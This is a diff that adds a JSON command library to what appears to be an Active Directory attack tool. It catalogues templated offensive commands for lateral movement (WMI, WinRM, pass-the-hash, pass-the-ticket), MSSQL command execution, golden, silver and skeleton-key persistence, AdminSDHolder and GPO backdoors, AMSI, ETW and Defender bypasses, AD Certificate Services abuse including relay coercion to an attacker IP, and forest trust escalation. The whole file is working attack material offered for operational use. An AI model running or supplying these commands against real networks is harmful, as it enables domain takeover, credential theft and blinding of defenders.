+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-admin"
+              ],
+              "opsec": "medium",
+              "description": "Execute commands via WMI — no service creation.",
+              "command": "impacket-wmiexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}\nimpacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "wmi-002",
+              "title": "WMI Exec (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Remote WMI command execution via CrackMapExec.",
+              "command": "crackmapexec wmi {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}\ncrackmapexec wmi {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH}",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "winrm",
+          "label": "WinRM",
+          "commands": [
+            {
+              "id": "winrm-001",
+              "title": "WinRM (Evil-WinRM)",
+              "tool": "Evil-WinRM",
+              "tags": [
+                "linux",
+                "requires-winrm",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Interactive PowerShell session over WinRM (port 5985/5986).",
+              "command": "evil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}\nevil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH}\nevil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -s ./ -e ./  # Load PS scripts",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "winrm-002",
+              "title": "WinRM (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Check WinRM access and execute commands.",
+              "command": "crackmapexec winrm {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}\ncrackmapexec winrm {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -x \"whoami\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "pth",
+          "label": "Pass-the-Hash",
+          "commands": [
+            {
+              "id": "pth-001",
+              "title": "Pass-the-Hash (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-ntlm-hash",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Authenticate with NTLM hash instead of plaintext password.",
+              "command": "impacket-psexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}\nimpacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}\nimpacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "pth-002",
+              "title": "Pass-the-Hash (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-ntlm-hash"
+              ],
+              "opsec": "medium",
+              "description": "Spray hash across the network to find valid access.",
+              "command": "crackmapexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH}\ncrackmapexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH} --local-auth",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "ptt",
+          "label": "Pass-the-Ticket",
+          "commands": [
+            {
+              "id": "ptt-001",
+              "title": "Extract & Inject Ticket (Rubeus)",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Extract Kerberos tickets and inject them for impersonation.",
+              "command": ".\\Rubeus.exe dump /nowrap  # List all tickets\n.\\Rubeus.exe dump /user:administrator /service:krbtgt /nowrap\n.\\Rubeus.exe ptt /ticket:<base64_ticket>\n.\\Rubeus.exe createnetonly /program:\"cmd.exe\" /show",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "ptt-002",
+              "title": "Pass-the-Ticket (Linux)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-tgt"
+              ],
+              "opsec": "medium",
+              "description": "Use Kerberos .ccache ticket on Linux for auth.",
+              "command": "export KRB5CCNAME=/tmp/ticket.ccache\nimpacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass\nimpacket-secretsdump {DOMAIN}/Administrator@{DC_IP} -k -no-pass",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "mssql",
+          "label": "MSSQL Abuse",
+          "commands": [
+            {
+              "id": "mssql-001",
+              "title": "Discover & Connect to MSSQL",
+              "tool": "impacket / netexec",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Find SQL servers via SPNs and authenticate (SQL or Windows auth).",
+              "command": "# Find MSSQL SPNs\nGet-DomainUser -SPN | ? { $_.serviceprincipalname -match \"MSSQL\" }\n\n# Connect (Windows auth)\nimpacket-mssqlclient {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER} -windows-auth\n\n# Spray / check access across hosts\nnetexec mssql {DC_IP}/24 -u {USERNAME} -p {PASSWORD}",
+              "next_steps": [
+                "mssql-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "mssql-002",
+              "title": "MSSQL Command Exec (xp_cmdshell)",
+              "tool": "impacket / netexec",
+              "tags": [
+                "requires-sql-admin"
+              ],
+              "opsec": "high",
+              "description": "Enable and use xp_cmdshell for OS command execution from SQL.",
+              "command": "# In mssqlclient:\nenable_xp_cmdshell\nxp_cmdshell whoami\n\n# netexec one-liner:\nnetexec mssql {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -x \"whoami\"\n\n# Capture/relay SQL service NetNTLM hash:\nnetexec mssql {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M mssql_priv",
+              "next_steps": [
+                "llmnr-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "mssql-003",
+              "title": "MSSQL Linked Server Chaining",
+              "tool": "impacket",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Pivot across trusted linked SQL servers — often runs as higher privilege.",
+              "command": "# Enumerate linked servers\nenum_links\n\n# Execute on a linked server\nexec_as_login {LINKED_LOGIN}\nEXEC ('xp_cmdshell ''whoami''') AT [{LINKED_SERVER}]",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "persistence",
+      "label": "Persistence",
+      "icon": "🔐",
+      "color": "#a29bfe",
+      "subsections": [
+        {
+          "key": "golden-ticket",
+          "label": "Golden Ticket",
+          "commands": [
+            {
+              "id": "golden-ticket-001",
+              "title": "Golden Ticket (Mimikatz)",
+              "tool": "Mimikatz",
+              "tags": [
+                "windows",
+                "requires-krbtgt-hash",
+                "persistence",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Forge TGT using krbtgt hash — persistent DA access.",
+              "command": "# Get domain SID first:\nGet-DomainSID  # PowerView\n\n# Create golden ticket:\nmimikatz # kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{DOMAIN_SID} /krbtgt:{NTLM_HASH} /ptt\n\n# Rubeus:\n.\\Rubeus.exe golden /rc4:{NTLM_HASH} /domain:{DOMAIN} /sid:{DOMAIN_SID} /user:Administrator /ptt",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "golden-ticket-002",
+              "title": "Golden Ticket (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-krbtgt-hash",
+                "persistence"
+              ],
+              "opsec": "medium",
+              "description": "Create golden ticket on Linux for use with impacket tools.",
+              "command": "impacket-ticketer -nthash {NTLM_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "silver-ticket",
+          "label": "Silver Ticket",
+          "commands": [
+            {
+              "id": "silver-001",
+              "title": "Silver Ticket (Mimikatz)",
+              "tool": "Mimikatz",
+              "tags": [
+                "windows",
+                "requires-service-hash",
+                "stealthy"
+              ],
+              "opsec": "low",
+              "description": "Forge TGS for specific service — stealthier than golden ticket.",
+              "command": "mimikatz # kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{DOMAIN_SID} /target:{TARGET_COMPUTER}.{DOMAIN} /service:cifs /rc4:{NTLM_HASH} /ptt\n\n# Common services: cifs, host, http, wsman, ldap, mssql",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "skeleton-key",
+          "label": "Skeleton Key",
+          "commands": [
+            {
+              "id": "skeleton-001",
+              "title": "Skeleton Key (Mimikatz)",
+              "tool": "Mimikatz",
+              "tags": [
+                "windows",
+                "requires-da",
+                "very-noisy",
+                "destructive"
+              ],
+              "opsec": "critical",
+              "description": "Patch LSASS on DC — use 'mimikatz' as password for any account.",
+              "command": "# Must run on DC with DA rights:\nmimikatz # privilege::debug\nmimikatz # misc::skeleton\n# Now any account can auth with password \"mimikatz\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "adminsdholder",
+          "label": "AdminSDHolder Abuse",
+          "commands": [
+            {
+              "id": "admin-sdholder-001",
+              "title": "AdminSDHolder Backdoor",
+              "tool": "PowerView",
+              "tags": [
+                "requires-da",
+                "stealthy",
+                "persistence"
+              ],
+              "opsec": "low",
+              "description": "Add user to AdminSDHolder ACL — propagated to all protected groups.",
+              "command": "Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" -PrincipalIdentity {USERNAME} -Rights All -Verbose\n\n# Verify:\nGet-DomainObjectAcl -Identity \"AdminSDHolder\" -ResolveGUIDs | Where-Object {$_.IdentityReference -match {USERNAME}}",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "backdoored-gpo",
+          "label": "Backdoored GPO",
+          "commands": [
+            {
+              "id": "gpo-backdoor-001",
+              "title": "Backdoor GPO (SharpGPOAbuse)",
+              "tool": "SharpGPOAbuse",
+              "tags": [
+                "requires-gpo-write",
+                "noisy",
+                "persistence"
+              ],
+              "opsec": "high",
+              "description": "Embed persistence via scheduled task in a GPO.",
+              "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Persistence\" --Author {DOMAIN}\\{USERNAME} --Command \"powershell.exe\" --Arguments '-enc <BASE64_PAYLOAD>' --GPOName \"Target GPO\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "evasion",
+      "label": "Defense Evasion",
+      "icon": "🛡️",
+      "color": "#fd9644",
+      "subsections": [
+        {
+          "key": "amsi-bypass",
+          "label": "AMSI Bypass",
+          "commands": [
+            {
+              "id": "amsi-001",
+              "title": "AMSI Bypass (Memory Patch)",
+              "tool": "PowerShell",
+              "tags": [
+                "windows",
+                "powershell",
+                "evasion"
+              ],
+              "opsec": "medium",
+              "description": "Patch AMSI in memory to disable scanning of scripts.",
+              "command": "# Method 1 - Reflection patch:\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Method 2 - Matt Graeber:\n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null), 0)\n\n# Method 3 - Obfuscated:\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$b=$a.GetField('amsiInitFailed','NonPublic,Static');\n$b.SetValue($null,$true)",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "amsi-002",
+              "title": "AMSI Bypass (Invoke-Obfuscation)",
+              "tool": "Invoke-Obfuscation",
+              "tags": [
+                "powershell",
+                "evasion"
+              ],
+              "opsec": "medium",
+              "description": "Obfuscate PowerShell scripts to bypass AMSI detection.",
+              "command": "Import-Module .\\Invoke-Obfuscation.ps1\nInvoke-Obfuscation\n# SELECT TOKEN -> ALL -> 1 (Token obfuscation)\n\n# Or use string manipulation:\n$c = 'Am'+'siUtils'; $a=[Ref].Assembly.GetType(\"System.Management.Automation.$c\")",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "defender-bypass",
+          "label": "Defender Bypass",
+          "commands": [
+            {
+              "id": "def-001",
+              "title": "Disable Defender (requires admin)",
+              "tool": "PowerShell",
+              "tags": [
+                "windows",
+                "requires-admin",
+                "very-noisy"
+              ],
+              "opsec": "critical",
+              "description": "Disable Windows Defender — extremely noisy, logged by EDR.",
+              "command": "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nAdd-MpPreference -ExclusionPath C:\\ \n\n# Via CME:\ncrackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M defender",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "def-002",
+              "title": "Defender Exclusion Adding",
+              "tool": "PowerShell",
+              "tags": [
+                "windows",
+                "requires-admin",
+                "evasion"
+              ],
+              "opsec": "high",
+              "description": "Add exclusion path to avoid scanning your tools.",
+              "command": "Add-MpPreference -ExclusionPath \"C:\\Users\\Public\"\nAdd-MpPreference -ExclusionExtension \".exe,.ps1\"\nAdd-MpPreference -ExclusionProcess \"mimikatz.exe\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "etw-bypass",
+          "label": "ETW Bypass",
+          "commands": [
+            {
+              "id": "etw-001",
+              "title": "ETW Patching",
+              "tool": "PowerShell",
+              "tags": [
+                "windows",
+                "evasion",
+                "advanced"
+              ],
+              "opsec": "high",
+              "description": "Patch Event Tracing for Windows to blind logging.",
+              "command": "# ETW patch in PowerShell:\n[Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.Registry') | Out-Null\n$a = [Threading.Thread]::GetDomain().Load([Convert]::FromBase64String(\"...\"))\n\n# Or via clrjit.dll patch method\n# *** Use specific ETW bypass tools like SilentMoonwalk ***",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "tickets",
+      "label": "Auth & Tickets",
+      "icon": "🎫",
+      "color": "#ff6b81",
+      "subsections": [
+        {
+          "key": "kerberos",
+          "label": "Kerberos Tickets",
+          "commands": [
+            {
+              "id": "tkt-001",
+              "title": "Request TGT (Rubeus)",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Request a TGT for a user.",
+              "command": ".\\Rubeus.exe asktgt /user:{USERNAME} /password:{PASSWORD} /domain:{DOMAIN} /dc:{DC_IP} /ptt\n.\\Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /domain:{DOMAIN} /dc:{DC_IP} /ptt",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "tkt-002",
+              "title": "Request TGT (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Request TGT from Linux.",
+              "command": "impacket-getTGT {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-getTGT {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH}\nexport KRB5CCNAME={USERNAME}.ccache",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "tkt-003",
+              "title": "List Tickets (klist / Rubeus)",
+              "tool": "Rubeus / klist",
+              "tags": [
+                "windows"
+              ],
+              "opsec": "none",
+              "description": "Enumerate cached Kerberos tickets on the system.",
+              "command": "klist  # Built-in\n.\\Rubeus.exe klist\n.\\Rubeus.exe dump /nowrap  # Dump tickets",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "tkt-004",
+              "title": "Overpass-the-Hash (impacket)",
+              "tool": "impacket / Rubeus",
+              "tags": [
+                "requires-ntlm-hash",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Convert NTLM hash to Kerberos TGT.",
+              "command": "impacket-getTGT {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH}\nexport KRB5CCNAME={USERNAME}.ccache\n\n# Rubeus:\n.\\Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /domain:{DOMAIN} /ptt",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "tkt-005",
+              "title": "Constrained Delegation S4U",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "requires-service-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "S4U2Self + S4U2Proxy to impersonate any user to a service.",
+              "command": ".\\Rubeus.exe s4u /user:{USERNAME} /rc4:{NTLM_HASH} /impersonateuser:Administrator /msdsspn:\"cifs/{TARGET_COMPUTER}.{DOMAIN}\" /ptt /nowrap",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "adcs",
+      "label": "AD Certificate Services",
+      "icon": "📜",
+      "color": "#54a0ff",
+      "subsections": [
+        {
+          "key": "adcs-enum",
+          "label": "Enumerate CA & Templates",
+          "commands": [
+            {
+              "id": "adcs-enum-001",
+              "title": "Find CAs & Vulnerable Templates (Certipy)",
+              "tool": "Certipy",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "low",
+              "description": "Enumerate ADCS — find the CA, certificate templates, and auto-flag ESC1-ESC8 misconfigs.",
+              "command": "# Full enumeration — outputs JSON + text, flags vulnerabilities\ncertipy find -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} -stdout\n\n# Only show vulnerable templates (recommended first look)\ncertipy find -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} -vulnerable -stdout\n\n# With NTLM hash, save BloodHound-importable output\ncertipy find -u {USERNAME}@{DOMAIN} -hashes :{NTLM_HASH} -dc-ip {DC_IP} -vulnerable -bloodhound",
+              "next_steps": [
+                "adcs-esc1-001",
+                "adcs-esc8-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "adcs-enum-002",
+              "title": "Enumerate ADCS (Certify / Windows)",
+              "tool": "Certify",
+              "tags": [
+                "windows",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Windows-side ADCS enumeration with Certify — find vulnerable templates.",
+              "command": "# Find vulnerable templates\n.\\Certify.exe find /vulnerable\n\n# Find all CAs\n.\\Certify.exe cas\n\n# Show templates allowing enrollment for current user\n.\\Certify.exe find /enrolleeSuppliesSubject",
+              "next_steps": [
+                "adcs-esc1-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "esc1",
+          "label": "ESC1 — SAN Impersonation",
+          "commands": [
+            {
+              "id": "adcs-esc1-001",
+              "title": "ESC1 Abuse (Certipy)",
+              "tool": "Certipy",
+              "tags": [
+                "linux",
+                "high-value",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Template allows enrollee-supplied SAN + client auth. Request a cert AS a Domain Admin.",
+              "command": "# Request a cert impersonating a DA via Subject Alternative Name\ncertipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} \\\n  -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}\n\n# Authenticate with the cert to retrieve NT hash + TGT\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}",
+              "next_steps": [
+                "tkt-002",
+                "pth-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "adcs-esc1-002",
+              "title": "ESC1 Abuse (Certify + Rubeus)",
+              "tool": "Certify / Rubeus",
+              "tags": [
+                "windows",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Windows-side ESC1: request cert with alt name, convert, then PTT.",
+              "command": "# 1. Request impersonation cert\n.\\Certify.exe request /ca:{CA_NAME} /template:{TEMPLATE} /altname:administrator\n\n# 2. Convert PEM -> PFX (paste cert+key into cert.pem)\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n# 3. Auth with cert to get TGT\n.\\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:{PASSWORD} /ptt",
+              "next_steps": [
+                "ptt-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "esc8",
+          "label": "ESC8 — NTLM Relay to AD CS",
+          "commands": [
+            {
+              "id": "adcs-esc8-001",
+              "title": "ESC8 Relay to Web Enrollment (Certipy)",
+              "tool": "Certipy / impacket",
+              "tags": [
+                "linux",
+                "high-value",
+                "no-creds"
+              ],
+              "opsec": "high",
+              "description": "Relay coerced machine auth to the CA HTTP enrollment endpoint to obtain a DC certificate.",
+              "command": "# 1. Start the relay targeting the CA web enrollment\ncertipy relay -ca {CA_HOST} -template DomainController\n\n# 2. Coerce the DC to authenticate (PetitPotam / Coercer)\npython3 PetitPotam.py -u {USERNAME} -p {PASSWORD} {ATTACKER_IP} {DC_IP}\n\n# 3. Auth with the captured DC cert -> DCSync\ncertipy auth -pfx dc.pfx -dc-ip {DC_IP}",
+              "next_steps": [
+                "coerce-001",
+                "cred-dump-004"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "esc-others",
+          "label": "ESC2/3/4/6/7/9 & Shadow",
+          "commands": [
+            {
+              "id": "adcs-esc4-001",
+              "title": "ESC4 — Template ACL Takeover",
+              "tool": "Certipy",
+              "tags": [
+                "linux",
+                "high-value",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "You have write rights over a template — reconfigure it to be ESC1-vulnerable, then abuse.",
+              "command": "# Make the template vulnerable (enrollee supplies subject + client auth)\ncertipy template -u {USERNAME}@{DOMAIN} -p {PASSWORD} -template {TEMPLATE} -dc-ip {DC_IP} -write-default-configuration\n\n# Then request as ESC1\ncertipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}",
+              "next_steps": [
+                "adcs-esc1-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "adcs-esc6-001",
+              "title": "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
+              "tool": "Certipy",
+              "tags": [
+                "linux",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "CA accepts arbitrary SAN on ANY template — request impersonation cert directly.",
+              "command": "certipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template User -upn administrator@{DOMAIN}\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}",
+              "next_steps": [
+                "pth-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "adcs-esc9-001",
+              "title": "ESC9/10 — No Security Extension",
+              "tool": "Certipy",
+              "tags": [
+                "linux",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Abuse weak cert mapping (szOID_NTDS_CA_SECURITY_EXT missing) with GenericWrite over a victim.",
+              "command": "# Set victim UPN to target admin, request cert, then revert\ncertipy account update -u {USERNAME}@{DOMAIN} -p {PASSWORD} -user {VICTIM} -upn administrator\ncertipy req -u {VICTIM}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template {TEMPLATE}\ncertipy account update -u {USERNAME}@{DOMAIN} -p {PASSWORD} -user {VICTIM} -upn {VICTIM}@{DOMAIN}\ncertipy auth -pfx administrator.pfx -domain {DOMAIN}",
+              "next_steps": [
+                "pth-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "adcs-theft-001",
+              "title": "Cert Theft & Persistence (THEFT/PERSIST)",
+              "tool": "Certipy / Certify",
+              "tags": [
+                "high-value",
+                "persistence"
+              ],
+              "opsec": "medium",
+              "description": "Steal existing certs from machines (THEFT1-5) or enroll a user cert for long-term persistence.",
+              "command": "# Extract certs from the local machine store (Windows)\n.\\Certify.exe list\n\n# Persistence: enroll a User cert (valid ~1yr, survives password resets)\n.\\Certify.exe request /ca:{CA_NAME} /template:User\n\n# Certipy: extract from PFX you already hold\ncertipy cert -pfx user.pfx -nokey -out user.crt",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "trusts",
+      "label": "Trust & Forest Abuse",
+      "icon": "🌲",
+      "color": "#1dd1a1",
+      "subsections": [
+        {
+          "key": "trust-enum",
+          "label": "Enumerate Trusts",
+          "commands": [
+            {
+              "id": "trust-enum-001",
+              "title": "Enumerate Domain & Forest Trusts",
+              "tool": "PowerView / netexec",
+              "tags": [
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Map all trust relationships — direction, transitivity, and SID filtering.",
+              "command": "# PowerView\nGet-DomainTrust\nGet-DomainTrustMapping\nGet-ForestTrust\n\n# nltest (built-in)\nnltest /domain_trusts /all_trusts\n\n# netexec\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M enum_trusts",
+              "next_steps": [
+                "trust-child-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "intra-forest",
+          "label": "Child → Parent (Intra-Forest)",
+          "commands": [
+            {
+              "id": "trust-child-001",
+              "title": "Child-to-Parent via SID History (Golden)",
+              "tool": "Mimikatz / impacket",
+              "tags": [
+                "requires-da-child",
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "From child DA, forge an inter-realm golden ticket with Enterprise Admins SID history to own the forest root.",
+              "command": "# Need: child krbtgt hash, child domain SID, parent (root) domain SID\n# Get root domain SID + Enterprise Admins SID (ends -519)\n\n# impacket (raiseChild automates the whole chain):\nimpacket-raiseChild {CHILD_DOMAIN}/{USERNAME}:{PASSWORD}\n\n# Manual golden w/ SID history (Mimikatz):\nkerberos::golden /user:Administrator /domain:{CHILD_DOMAIN} /sid:{CHILD_SID} /krbtgt:{NTLM_HASH} /sids:{ROOT_SID}-519 /ptt",
+              "next_steps": [
+                "cred-dump-004"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "trust-ticket-001",
+              "title": "Inter-Realm Trust Ticket (External Trust)",
+              "tool": "Rubeus / impacket",
+              "tags": [
+                "requires-trust-key",
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "Forge a trust (inter-realm TGT) using the trust key to access a trusting domain.",
+              "command": "# Dump the trust key (RC4) of the trust account:\nlsadump::trust /patch    # Mimikatz on DC\n\n# Forge inter-realm ticket and request a TGS in target domain (Rubeus):\n.\\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/{TARGET_COMPUTER}.{TARGET_DOMAIN} /dc:{TARGET_DC} /ptt",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
